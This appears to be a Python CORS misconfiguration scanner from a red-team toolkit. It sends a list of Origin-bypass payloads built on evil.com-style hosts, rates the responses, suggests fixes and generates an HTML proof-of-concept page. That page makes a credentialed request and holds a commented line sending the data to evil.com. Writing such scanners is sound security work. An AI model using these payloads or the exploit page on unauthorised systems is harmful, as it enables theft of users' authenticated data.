#!/usr/bin/env python3
"""
CORS增强检测模块
功能: 扩展绕过Payload、子域名绕过、正则绕过、凭证泄露检测
作者: AutoRedTeam
"""

import logging
from dataclasses import dataclass
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

import requests

logger = logging.getLogger(__name__)

# 统一 HTTP 客户端工厂
try:
    from core.http import get_sync_client

    HAS_HTTP_FACTORY = True
except ImportError:
    HAS_HTTP_FACTORY = False


class CORSVulnType(Enum):
    """CORS漏洞类型"""

    ORIGIN_REFLECTED = "origin_reflected"  # Origin直接反射
    NULL_ORIGIN = "null_origin_allowed"  # 允许null Origin
    SUBDOMAIN_BYPASS = "subdomain_bypass"  # 子域名绕过
    REGEX_BYPASS = "regex_bypass"  # 正则绕过
    CREDENTIALS_LEAK = "credentials_leak"  # 凭证泄露
    WILDCARD_WITH_CREDS = "wildcard_with_credentials"  # 通配符+凭证
    PREFIX_BYPASS = "prefix_bypass"  # 前缀绕过
    SUFFIX_BYPASS = "suffix_bypass"  # 后缀绕过


@dataclass
class CORSTestResult:
    """CORS测试结果"""

    vuln_type: CORSVulnType
    severity: str
    origin_sent: str
    origin_received: str
    allow_credentials: bool
    description: str
    exploitable: bool = False


@dataclass
class CORSVulnerability:
    """CORS漏洞详情"""

    url: str
    vuln_type: CORSVulnType
    severity: str
    origin_payload: str
    response_headers: Dict[str, str]
    exploitable: bool
    proof_of_concept: str
    remediation: str


class CORSEnhancedTester:
    """CORS增强测试器"""

    # 扩展的Origin绕过Payloads模板
    # {target} 会被替换为目标域名
    ORIGIN_BYPASS_TEMPLATES = [
        # === 基础测试 ===
        ("null", "null_origin", "空Origin (iframe/data URI)"),
        ("", "empty_origin", "无Origin头"),
        # === 子域名欺骗 ===
        ("http://{target}.evil.com", "subdomain_suffix", "目标作为子域名后缀"),
        ("http://evil.{target}", "subdomain_prefix", "目标作为子域名前缀"),
        ("http://{target_nodot}evil.com", "no_dot_suffix", "无点连接后缀"),
        ("http://evil{target_nodot}.com", "no_dot_prefix", "无点连接前缀"),
        ("http://www.{target}.evil.com", "www_subdomain", "www子域名"),
        ("http://api.{target}.evil.com", "api_subdomain", "api子域名"),
        # === 协议混淆 ===
        ("http://{target}", "http_downgrade", "HTTP降级"),
        ("https://{target}:443", "explicit_port", "显式端口"),
        ("https://{target}:80", "wrong_port", "错误端口"),
        ("https://{target}@evil.com", "userinfo", "用户信息注入"),
        # === URL编码绕过 ===
        ("https://{target}%60.evil.com", "backtick_encoded", "反引号编码"),
        ("https://{target}%09.evil.com", "tab_encoded", "Tab编码"),
        ("https://{target}%00.evil.com", "null_byte", "空字节"),
        ("https://{target}%0d.evil.com", "cr_encoded", "回车编码"),
        ("https://{target}%0a.evil.com", "lf_encoded", "换行编码"),
        ("https://{target}%20.evil.com", "space_encoded", "空格编码"),
        # === 特殊字符 ===
        ("https://{target}_.evil.com", "underscore", "下划线"),
        ("https://{target}-.evil.com", "hyphen", "连字符"),
        ("https://{target}!.evil.com", "exclamation", "感叹号"),
        ("https://{target}$.evil.com", "dollar", "美元符"),
        ("https://{target}&.evil.com", "ampersand", "与符号"),
        ("https://{target}#.evil.com", "hash", "井号"),
        # === Unicode绕过 ===
        ("https://{target}\u3002evil.com", "unicode_dot", "Unicode句号"),
        ("https://{target}\uff0eevil.com", "fullwidth_dot", "全角句号"),
        ("https://{target}\u2024evil.com", "one_dot_leader", "Unicode点"),
        # === 正则绕过 ===
        ("https://{target}.com.evil.com", "domain_extension", "域名扩展"),
        ("https://not{target}", "prefix_injection", "前缀注入"),
        ("https://{target}test.com", "suffix_injection", "后缀注入"),
        # === 反射检测 ===
        ("https://{target}", "exact_match", "完全匹配"),
        ("https://ATTACKER.COM", "attacker_domain", "攻击者域名"),
    ]

    # 严重性评级
    SEVERITY_MAP = {
        "origin_reflected": "high",
        "null_origin_allowed": "medium",
        "wildcard_with_credentials": "critical",
        "credentials_leak": "high",
        "subdomain_bypass": "high",
        "regex_bypass": "high",
        "prefix_bypass": "medium",
        "suffix_bypass": "medium",
    }

    def __init__(self, timeout: float = 10.0, proxy: Optional[str] = None):
        """
        初始化CORS测试器

        Args:
            timeout: 请求超时时间
            proxy: 代理地址
        """
        self.timeout = timeout
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        # 优先使用统一 HTTP 客户端工厂
        if HAS_HTTP_FACTORY:
            self._session = get_sync_client(proxy=proxy, force_new=True)
        else:
            self._session = requests.Session()
        self._session.headers.update(
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        )

    def _extract_domain(self, url: str) -> Tuple[str, str]:
        """
        提取域名

        Returns:
            (完整域名, 无点域名)
        """
        parsed = urlparse(url)
        domain = parsed.netloc
        # 移除端口
        if ":" in domain:
            domain = domain.split(":")[0]
        # 无点版本
        domain_nodot = domain.replace(".", "")
        return domain, domain_nodot

    def _generate_payloads(self, target_url: str) -> List[Tuple[str, str, str]]:
        """
        生成针对目标的Payload列表

        Returns:
            [(origin_payload, payload_type, description), ...]
        """
        domain, domain_nodot = self._extract_domain(target_url)
        payloads = []

        for template, payload_type, desc in self.ORIGIN_BYPASS_TEMPLATES:
            if template:
                origin = template.format(target=domain, target_nodot=domain_nodot)
            else:
                origin = template
            payloads.append((origin, payload_type, desc))

        return payloads

    def _send_cors_request(self, url: str, origin: str, method: str = "GET") -> Dict[str, Any]:
        """
        发送CORS测试请求

        Returns:
            包含响应信息的字典
        """
        headers = {}
        if origin:
            headers["Origin"] = origin

        try:
            resp = self._session.request(
                method,
                url,
                headers=headers,
                timeout=self.timeout,
                proxies=self.proxies,
                allow_redirects=False,
            )

            return {
                "success": True,
                "status_code": resp.status_code,
                "headers": dict(resp.headers),
                "acao": resp.headers.get("Access-Control-Allow-Origin", ""),
                "acac": resp.headers.get("Access-Control-Allow-Credentials", ""),
                "acam": resp.headers.get("Access-Control-Allow-Methods", ""),
                "acah": resp.headers.get("Access-Control-Allow-Headers", ""),
                "aceo": resp.headers.get("Access-Control-Expose-Headers", ""),
            }

        except requests.RequestException as e:
            return {"success": False, "error": str(e)}

    def _analyze_response(
        self, origin_sent: str, response: Dict[str, Any]
    ) -> Optional[CORSTestResult]:
        """
        分析CORS响应,判断是否存在漏洞
        """
        if not response.get("success"):
            return None

        acao = response.get("acao", "")
        acac = response.get("acac", "").lower() == "true"

        # 没有ACAO头,不存在CORS配置
        if not acao:
            return None

        vuln_type = None
        severity = "low"
        exploitable = False
        description = ""

        # 检查通配符+凭证 (最危险)
        if acao == "*" and acac:
            vuln_type = CORSVulnType.WILDCARD_WITH_CREDS
            severity = "critical"
            exploitable = True
            description = "CORS配置允许任意Origin并携带凭证"

        # 检查Origin反射
        elif acao == origin_sent:
            if origin_sent == "null":
                vuln_type = CORSVulnType.NULL_ORIGIN
                severity = "medium"
                exploitable = acac
                description = "允许null Origin"
            elif "evil" in origin_sent.lower():
                vuln_type = CORSVulnType.ORIGIN_REFLECTED
                severity = "high" if acac else "medium"
                exploitable = acac
                description = f"Origin被反射: {origin_sent}"

        # 检查通配符
        elif acao == "*":
            severity = "low"
            description = "使用通配符但不允许凭证"

        if vuln_type:
            return CORSTestResult(
                vuln_type=vuln_type,
                severity=severity,
                origin_sent=origin_sent,
                origin_received=acao,
                allow_credentials=acac,
                description=description,
                exploitable=exploitable,
            )

        return None

    def test_single_origin(self, url: str, origin: str) -> Dict[str, Any]:
        """
        测试单个Origin

        Args:
            url: 目标URL
            origin: Origin值

        Returns:
            测试结果
        """
        response = self._send_cors_request(url, origin)

        result = {
            "url": url,
            "origin_sent": origin,
            "success": response.get("success", False),
            "vulnerable": False,
        }

        if not response.get("success"):
            result["error"] = response.get("error")
            return result

        result["response"] = {
            "status_code": response["status_code"],
            "acao": response["acao"],
            "acac": response["acac"],
        }

        vuln = self._analyze_response(origin, response)
        if vuln:
            result["vulnerable"] = True
            result["vulnerability"] = {
                "type": vuln.vuln_type.value,
                "severity": vuln.severity,
                "exploitable": vuln.exploitable,
                "description": vuln.description,
            }

        return result

    def test_preflight(
        self,
        url: str,
        origin: str = "https://evil.com",
        method: str = "PUT",
        headers: str = "X-Custom-Header",
    ) -> Dict[str, Any]:
        """
        测试预检请求 (OPTIONS)

        Args:
            url: 目标URL
            origin: Origin值
            method: Access-Control-Request-Method
            headers: Access-Control-Request-Headers
        """
        result = {"url": url, "type": "preflight", "vulnerable": False}

        try:
            resp = self._session.options(
                url,
                headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": method,
                    "Access-Control-Request-Headers": headers,
                },
                timeout=self.timeout,
                proxies=self.proxies,
            )

            result["response"] = {
                "status_code": resp.status_code,
                "acao": resp.headers.get("Access-Control-Allow-Origin", ""),
                "acac": resp.headers.get("Access-Control-Allow-Credentials", ""),
                "acam": resp.headers.get("Access-Control-Allow-Methods", ""),
                "acah": resp.headers.get("Access-Control-Allow-Headers", ""),
            }

            # 分析预检响应
            acao = result["response"]["acao"]
            acac = result["response"]["acac"].lower() == "true"

            if acao == origin or acao == "*":
                result["vulnerable"] = True
                result["severity"] = "high" if acac else "medium"
                result["description"] = f"预检请求允许Origin: {acao}"

        except requests.RequestException as e:
            result["error"] = str(e)

        return result

    def test_all_bypasses(self, url: str, include_preflight: bool = True) -> Dict[str, Any]:
        """
        测试所有绕过方法

        Args:
            url: 目标URL
            include_preflight: 是否包含预检测试

        Returns:
            完整测试结果
        """
        result = {
            "url": url,
            "total_tests": 0,
            "vulnerabilities": [],
            "tests": [],
            "summary": {"vulnerable": False, "highest_severity": "none", "exploitable_count": 0},
        }

        severity_order = {"critical": 4, "high": 3, "medium": 2, "low": 1, "none": 0}
        highest_severity = "none"

        # 生成Payloads
        payloads = self._generate_payloads(url)

        for origin, payload_type, description in payloads:
            result["total_tests"] += 1

            test_result = {
                "payload_type": payload_type,
                "description": description,
                "origin": origin,
            }

            response = self._send_cors_request(url, origin)

            if not response.get("success"):
                test_result["error"] = response.get("error")
                result["tests"].append(test_result)
                continue

            test_result["acao"] = response.get("acao", "")
            test_result["acac"] = response.get("acac", "")

            vuln = self._analyze_response(origin, response)

            if vuln:
                test_result["vulnerable"] = True
                test_result["severity"] = vuln.severity
                test_result["exploitable"] = vuln.exploitable

                result["vulnerabilities"].append(
                    {
                        "type": vuln.vuln_type.value,
                        "severity": vuln.severity,
                        "origin_payload": origin,
                        "exploitable": vuln.exploitable,
                        "description": vuln.description,
                    }
                )

                if vuln.exploitable:
                    result["summary"]["exploitable_count"] += 1

                if severity_order.get(vuln.severity, 0) > severity_order.get(highest_severity, 0):
                    highest_severity = vuln.severity

            else:
                test_result["vulnerable"] = False

            result["tests"].append(test_result)

        # 预检测试
        if include_preflight:
            preflight_result = self.test_preflight(url)
            result["preflight"] = preflight_result
            result["total_tests"] += 1

            if preflight_result.get("vulnerable"):
                result["vulnerabilities"].append(
                    {
                        "type": "preflight_bypass",
                        "severity": preflight_result.get("severity", "medium"),
                        "description": preflight_result.get("description", ""),
                    }
                )

        # 更新摘要
        result["summary"]["vulnerable"] = len(result["vulnerabilities"]) > 0
        result["summary"]["highest_severity"] = highest_severity
        result["summary"]["vulnerability_count"] = len(result["vulnerabilities"])

        # 生成PoC
        if result["vulnerabilities"]:
            result["proof_of_concept"] = self._generate_poc(url, result["vulnerabilities"][0])

        # 修复建议
        result["remediation"] = self._get_remediation(result["vulnerabilities"])

        return result

    def _generate_poc(self, url: str, vuln: Dict) -> str:
        """生成漏洞利用PoC"""
        origin = vuln.get("origin_payload", "https://evil.com")

        poc = f"""
<!-- CORS漏洞PoC -->
<html>
<head>
    <title>CORS PoC</title>
</head>
<body>
    <h1>CORS Vulnerability PoC</h1>
    <div id="result"></div>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '{url}', true);
        xhr.withCredentials = true;  // 携带凭证
        xhr.onreadystatechange = function() {{
            if (xhr.readyState === 4) {{
                document.getElementById('result').innerHTML =
                    '<pre>' + xhr.responseText + '</pre>';
                // 发送到攻击者服务器
                // fetch('https://evil.com/collect?data=' + encodeURIComponent(xhr.responseText));
            }}
        }};
        xhr.send();
    </script>
</body>
</html>
"""
        return poc.strip()

    def _get_remediation(self, vulnerabilities: List[Dict]) -> List[str]:
        """获取修复建议"""
        remediations = [
            "1. 配置明确的Origin白名单,避免使用通配符*",
            "2. 如必须使用动态Origin,进行严格的域名验证",
            "3. 不要同时设置Access-Control-Allow-Credentials: true和通配符Origin",
            "4. 对于敏感API,考虑禁用CORS或使用Token认证",
        ]

        for vuln in vulnerabilities:
            vuln_type = vuln.get("type", "")

            if vuln_type == "null_origin_allowed":
                remediations.append("5. 禁止null Origin,防止iframe/data URI攻击")

            if vuln_type == "origin_reflected":
                remediations.append("5. 使用白名单验证而非反射Origin头")

        return list(set(remediations))


# 便捷函数
def quick_cors_scan(url: str) -> Dict[str, Any]:
    """快速CORS安全扫描"""
    tester = CORSEnhancedTester()
    return tester.test_all_bypasses(url)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
    # 测试示例
    test_url = "https://example.com/api/user"

    tester = CORSEnhancedTester()

    # 测试单个Origin
    result = tester.test_single_origin(test_url, "https://evil.com")
    logger.info(f"Single test vulnerable: {result.get('vulnerable')}")

    # 完整扫描
    # full_result = tester.test_all_bypasses(test_url)
    # print(f"Total vulnerabilities: {len(full_result['vulnerabilities'])}")
